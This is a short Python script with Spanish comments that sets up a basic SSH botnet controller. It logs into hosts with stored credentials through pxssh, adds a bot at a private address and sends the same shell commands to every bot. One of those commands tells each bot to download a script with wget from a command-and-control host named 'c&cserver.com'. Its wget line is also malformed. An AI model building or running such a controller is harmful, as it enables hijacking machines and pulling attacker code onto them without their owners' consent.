from pexpect import pxssh

class Bot:

   # inicializar nuevo cliente
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()


    # Shell seguro en el cliente
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print('Connection failure.')
            print(e)


    # enviar comando al cliente
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


# enviar un comando a todos los bots en la botnet
def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command)
        print('Output from ' + bot.host)
        print(attack)

# lista de bots en botnet
botnet = []

# agregue un nuevo bot a su botnet
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)

add_bot('10.0.0.59', '', '')

# listar el directorio de inicio del usuario
command_bots('ls')

# descargar scripts/archivos, etc.
command_bots("""wget  -O /Users/Owner/Desktop/ "http://c&cserver.com/script.py""")



    
        
        
